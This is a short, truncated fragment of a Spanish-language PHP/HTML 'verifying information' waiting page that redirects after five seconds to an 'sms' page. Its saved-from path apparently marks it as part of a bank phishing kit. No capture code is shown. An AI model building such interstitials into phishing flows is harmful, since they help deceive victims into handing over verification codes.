...
?>
<!DOCTYPE html>
<!-- saved from url=(0049)https://internacionaldecarga.com/bdved/espere.php -->
<html lang="es">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="refresh" content="5; url=./sms.e.php">
<style>
		body {
			...
			<form id="mainF" name="mainF">
				<div class="overlay" bis_skin_checked="1">
					<div class="modalCustom" bis_skin_checked="1">
						<center>
							<img src="../img/logo.png" style="border-radius: 10px;" width="225px"><br>

							<h1 class="title" style="font-size: 21px;">Verificando Información</h1>
							...
							<p style="font-size: 14px;">Espera un momento, no cierres esta ventana.</p>
						</center>
					</div>
				</div>
			</form>
